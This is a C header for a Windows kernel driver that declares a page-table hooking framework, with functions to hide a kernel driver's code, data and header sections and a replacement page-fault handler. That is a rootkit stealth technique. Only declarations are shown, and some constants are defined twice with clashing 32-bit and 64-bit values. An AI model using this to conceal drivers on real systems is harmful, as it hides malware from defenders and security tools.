#ifndef __mmHook_h__ 
#define __mmHook_h__ 
//#include <ntdef.h>

//############################################ 
// KNOWN LIMITATION AND RESTRICTIONS 
// 1. No Multiprocessor Support 
// 2. No PAE Support 
// 3. No Hyperthreading Support 
//############################################ 
typedef struct _DXGK_PDE {
	union {
		struct {
			ULONGLONG Valid : 1;
			ULONGLONG Segment : 5;
			ULONGLONG Reserved : 6;
			ULONGLONG PageTableAddress : 52;
		};
		ULONGLONG Value;
	};
	unsigned int PageTableSizeInPages;
} DXGK_PDE;
typedef struct _DXGK_PTE {
	union {
		struct {
			ULONGLONG Valid1 : 1;
			ULONGLONG CacheCoherent : 1;
			ULONGLONG ReadOnly : 1;
			ULONGLONG Privileged : 1;
			ULONGLONG Segment : 5;
			ULONGLONG Reserved : 3;
			ULONGLONG PageAddress : 52;
		};
		ULONGLONG Value;
	};
} DXGK_PTE;
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
///////////////////////////////// CONSTANTS ////////////////////////////////// 
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 

//#define PROCESS_PAGE_DIR_BASE                  0xC0300000
//#define PROCESS_PAGE_TABLE_BASE                0xC0000000
#define PROCESS_PAGE_DIR_BASE                  0xFFFFF6FB40000000
#define PROCESS_PAGE_TABLE_BASE                        0x80000000


#define NTOSKRNL_PAGE						0x80400000 
#define LARGE_PAGE_SIZE						0x00400000 
#define	PROCESS_PAGE_DIR_BASE				0xC0300000 
#define PROCESS_PAGE_TABLE_BASE				0xC0000000 
#define HIGHEST_USER_ADDRESS				0x7FFF0000 
#define LOWEST_ADDRESS_IN_LARGE_PAGE_RANGE  0X80000000 
#define HIGHEST_ADDRESS_IN_LARGE_PAGE_RANGE	0x9FFFFFFF 
#define MAX_NUMBER_OF_HOOKED_PAGES			128 
#define NUM_HASH_BITS						12 //32 - log10(MAX_NUMBER_OF_HOOKED_PAGES) / log10(2) 

//PE section characteristics 
#define EXECUTABLE							0x20000000 
#define WRITABLE							0x80000000 
#define DISCARDABLE							0x2000000 

//user options for kernel driver hiding 
#define HIDE_CODE		0x00000001 // PE .text sections 
#define HIDE_DATA		0x00000002 // PE .data sections 
#define HIDE_HEADER		0x00000004 // PE header 
#define HIDE_SPECIAL	0x00000008 // user defined sections 
#define HIDE_ALL		0x00000010 // hide all but discardable sections in the PE 

#define MAX_NUMBER_OF_PE_SECTIONS			20 

//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
///////////////////////////////// ERROR CODES ////////////////////////////////// 
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 

#define ERROR_INCONSISTENT_PAGE_SIZE_ACROSS_RANGE -1 
#define	ERROR_PTE_NOT_PRESENT	-2 
#define	ERROR_PAGE_NOT_PRESENT	-3 
#define ERROR_INVALID_PARAMETER -4 
#define ERROR_PAGE_NOT_IN_LIST -5 
#define ERROR_EMPTY_LIST		-6 
#define ERROR_DRIVER_SECTIONS_MUST_BE_PAGE_ALIGNED  -7 
#define ERROR_DISCARDABLE_SECTION -8 
#define ERROR_CANT_INSERT_CALL -9 

//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
//////////////////////////////// DATA STRUCTURES ///////////////////////////// 
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
// PDEVICE_OBJECT  NextDriverInStack;
PDRIVER_DISPATCH NextDriverInStack;
typedef unsigned long* PPTE;

typedef struct _HOOKED_LIST_ENTRY
{
	struct _HOOKED_LIST_ENTRY * pNextEntry;
	PVOID pExecuteView;
	PVOID pReadWriteView;
	PPTE pExecutePte;
	PPTE pReadWritePte;
	PVOID pfnCallIntoHookedPage;
	ULONG pDriverStarts;
	ULONG pDriverEnds;
} HOOKED_LIST_ENTRY, *PHOOKED_LIST_ENTRY;



//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
//////////////////// LOW LEVEL INTERFACE FUNCTIONS /////////////////////////// 
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 

/** /
void HookMemoryPage(PVOID pExecutePage, PVOID pReadWritePage, PVOID pfnCallIntoHookedPage, PVOID pDriverStarts, PVOID pDriverEnds);
void UnhookMemoryPage(PVOID pExecutePage);
PVOID AllocateViewOfPage(PVOID VirtualAddress, BOOLEAN DuplicatePageContents, ULONG* pAllocatedMemory);
void DeallocateViewOfPage(PVOID VirtualAddress);
PVOID RoundDownToPageBoundary(PVOID VirtualAddress);
PVOID RoundUpToPageBoundary(PVOID VirtualAddress);
int GetNumberOfPagesInRange(PVOID LoVirtualAddress, PVOID HiVirtualAddress);



//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
//////////////////// HIGH LEVEL INTERFACE FUNCTIONS //////////////////////// 
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 

int HideKernelDriver(char* DriverName, int Options);
int UnhideKernelDriver(void);
int HideDriverSection(ULONG pDriverSectionHeader);
void HideDriverHeader(ULONG pDriverHeader);
void HideNtoskrnl();

//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
/////////////////////////////// SUPPORT FUNCTIONS //////////////////////////// 
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 

void NewInt0EHandler(void); //page fault handler 
/**/
//Functions to manage PTE's 
PPTE GetPteAddress(PVOID VirtualAddress);
ULONG GetPhysicalFrameAddress(PPTE pPte);


/** /
BOOLEAN IsInLargePage(PVOID VirtualAddress);
void DisableGlobalPageFeature(PPTE pPte);
void EnableGlobalPageFeature(PPTE pPTE);
void MarkPageNotPresent(PPTE pPte);
void MarkPagePresent(PPTE pPte);
void MarkPageReadWrite(PPTE pPte);
void MarkPageReadOnly(PPTE pPte);
void ReplacePhysicalFrameAddress(PPTE pPte, ULONG* oldFrame, ULONG newFrame);

//Functions to manage the list of hooked memory pages 
void PushPageIntoHookedList(HOOKED_LIST_ENTRY pHookedPage);
HOOKED_LIST_ENTRY* PopPageFromHookedList(int index);
HOOKED_LIST_ENTRY* FindPageInHookedList(ULONG VirtualAddress);
void FreeHookedList();


/**/






//IDT gate descriptor - see Intel System Developer's Manual Vol. 3 for details 
struct IDT_GATE
{
	unsigned OffsetLo : 16;   //bits 15....0 
	unsigned Selector : 16;   //segment selector 
	unsigned Reserved : 13;   //bits we don't need 
	unsigned Dpl : 2;	   //descriptor privilege level 
	unsigned Present : 1;	   //segment present flag 
	unsigned OffsetHi : 16;   //bits 32...16 
} ; //end struct 


struct IDT_INFO
{
	unsigned short wReserved;
	unsigned short wLimit;	//size of the table 
	struct IDT_GATE * pIdt;			//base address of the table 
};//end struct 

//@@@@@@@@@@@@@@@@@@@@@@ 
// PROTOTYPES 
//@@@@@@@@@@@@@@@@@@@@@@ 
//int HookInt(unsigned long* pOldHandler, unsigned long NewHandler, int IntNumber); //interrupt hook 
//int UnhookInt(unsigned long OldHandler, int IntNumber);


/**/
typedef struct _PTE
{
	ULONG Present : 1;
	ULONG Writable : 1;
	ULONG Owner : 1;
	ULONG WriteThrough : 1;
	ULONG CacheDisable : 1;
	ULONG Accessed : 1;
	ULONG Dirty : 1;
	ULONG LargePage : 1;
	ULONG Global : 1;
	ULONG ForUse1 : 1;
	ULONG ForUse2 : 1;
	ULONG ForUse3 : 1;
	ULONG PageFrameNumber : 20;
} zPTE, *zPPTE;
/**/

#endif
